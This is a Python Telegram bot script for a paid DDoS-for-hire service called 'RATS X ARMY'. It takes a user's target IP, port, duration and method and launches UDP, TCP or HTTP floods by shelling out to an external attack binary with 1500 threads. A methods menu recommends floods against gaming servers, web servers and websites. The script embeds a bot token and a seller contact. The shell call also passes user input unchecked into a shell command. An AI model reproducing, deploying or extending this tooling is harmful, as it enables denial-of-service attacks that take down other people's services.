#!/usr/bin/env python3
import telebot
import subprocess
import time
import threading
import json
import os
from datetime import datetime

# ========== CONFIG ==========
BOT_TOKEN = "8386508236:AAH_kO43h4ABGh4IM16YjzZeAUOKg-WGEv0"
ADMIN_ID = ["1434287051"]
USERS_FILE = "users.json"

# ========== DATA ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]]}

users_data = load_users()
users = users_data["users"]
cooldown = {}

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    if uid in users or uid in ADMIN_ID:
        bot.reply_to(msg, f"""🔥 RATS X ARMY DDOS BOT 🔥

✅ Status: Authorized
⚡ Methods: UDP | TCP | HTTP
⏱️ Max Time: 300s
🔧 Threads: 1500

📝 COMMANDS:
/attack IP PORT TIME METHOD
/methods
/stats
/help

👑 ADMIN: /add /remove /allusers

Buy: @ITS_BFC""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Buy access: @ITS_BFC")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    # Cooldown
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME METHOD\nExample: /attack 1.1.1.1 443 60 udp\nMethods: udp, tcp, http")
        return
    
    ip, port, duration, method = args[1], args[2], args[3], args[4].lower()
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
            return
        if method not in ["udp", "tcp", "http"]:
            bot.reply_to(msg, "❌ Methods: udp, tcp, http")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    cooldown[uid] = time.time()
    
    bot.reply_to(msg, f"""🔥 ATTACK LAUNCHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
⚡ Method: {method.upper()}
🔧 Threads: 1500

💥 Attack in progress...""")
    
    def run():
        cmd = f"./attack {ip} {port} {duration} 1500 {method}"
        subprocess.run(cmd, shell=True)
        bot.send_message(msg.chat.id, f"✅ Attack complete on {ip}:{port}")
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['methods'])
def methods(msg):
    bot.reply_to(msg, """⚡ ATTACK METHODS:

🔴 UDP FLOOD - Best for gaming (BGMI, Minecraft, Valorant)
   Ports: 443, 8080, 14000, 27015-27030

🔵 TCP FLOOD - Best for web servers
   Ports: 80, 443, 8080, 8443

🟢 HTTP FLOOD - Best for websites
   Ports: 80, 443

Example: /attack 1.1.1.1 443 60 udp""")

@bot.message_handler(commands=['stats'])
def stats(msg):
    bot.reply_to(msg, "📊 Use /attack to launch attacks\n📈 Contact @ITS_BFC for premium stats")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg, """🔥 RATS X ARMY HELP

COMMANDS:
/attack IP PORT TIME METHOD
/methods - Show attack methods
/stats - Your stats
/help - This menu

ADMIN:
/add USER_ID
/remove USER_ID
/allusers

Buy: @ITS_BFC""")

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=['add'])
def add_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    new = args[1]
    if new not in users:
        users.append(new)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {new} added!")
    else:
        bot.reply_to(msg, "User already exists!")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    rem = args[1]
    if rem in users and rem not in ADMIN_ID:
        users.remove(rem)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {rem} removed!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    user_list = "\n".join(users)
    bot.reply_to(msg, f"📋 USERS:\n{user_list}\nTotal: {len(users)}")

# ========== MAIN ==========
print("""
╔══════════════════════════════════════╗
║    🔥 RATS X ARMY BOT STARTED 🔥   ║
║        @ITS_BFC                ║
╠══════════════════════════════════════╣
║  ✅ Bot Online                      ║
║  ✅ Admin: @ITS_BFC               ║
║  ✅ Methods: UDP/TCP/HTTP           ║
╚══════════════════════════════════════╝
""")

bot.infinity_polling()